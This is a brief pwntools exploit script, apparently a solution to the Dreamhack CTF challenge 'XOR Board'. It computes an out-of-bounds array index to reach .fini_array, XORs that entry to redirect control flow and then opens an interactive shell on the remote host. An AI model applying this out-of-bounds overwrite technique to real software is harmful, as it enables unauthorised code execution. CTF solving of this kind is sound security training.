from pwn import *

port = 21436
rem = remote(b"host3.dreamhack.games", port)

elf = ELF("./Pwnable/XOR Board/problem/deploy/main")

def xor(i, j):
  rem.sendlineafter(b"> ", b"1")
  rem.sendlineafter(b"> ", f"{i} {j}".encode())

i = (elf.get_section_by_name('.fini_array').header.sh_addr - elf.symbols['arr']) // 8

xor(i, 0)
xor(i, 2)
xor(i, 3)
xor(i, 6)
xor(i, 9)
rem.sendlineafter(b"> ", b"3")
rem.interactive()